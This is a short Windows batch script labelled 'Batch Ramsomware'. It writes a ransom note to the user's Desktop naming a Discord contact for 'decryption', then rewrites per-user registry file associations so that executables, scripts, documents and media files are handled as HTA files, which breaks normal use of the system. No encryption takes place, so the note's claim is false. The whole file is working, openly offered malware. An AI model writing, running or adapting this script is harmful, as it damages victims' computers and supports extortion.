@echo off
Rem BY **Aincrad**

SET DESKTOP_REG_ENTRY="HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
SET DESKTOP_REG_KEY="Desktop"
SET DESKTOP_DIR=

FOR /F "tokens=1,2*" %%a IN ('REG QUERY %DESKTOP_REG_ENTRY% /v %DESKTOP_REG_KEY% ^| FINDSTR "REG_SZ"') DO (
    set DESKTOP_DIR="%%c"
)

(
  echo Batch Ramsomware
  echo TO Decrypt Your Files Contact:
  echo Discord: Necromancer#5811
) > %DESKTOP_DIR%\Readme_Ransomware.txt

:Virus
reg add HKCU\Software\Classes\.VBS /d "htafile" /f
reg add HKCU\Software\Classes\.docx /d "htafile" /f
reg add HKCU\Software\Classes\.pdf /d "htafile" /f
reg add HKCU\Software\Classes\.doc /d "htafile" /f
reg add HKCU\Software\Classes\.mp3 /d "htafile" /f
reg add HKCU\Software\Classes\.mp4 /d "htafile" /f
reg add HKCU\Software\Classes\.EXE /d "htafile" /f
reg add HKCU\Software\Classes\.bat /d "htafile" /f
reg add HKCU\Software\Classes\.jar /d "htafile" /f
reg add HKCU\Software\Classes\.py /d "htafile" /f
reg add HKCU\Software\Classes\.ps1 /d "htafile" /f
exit
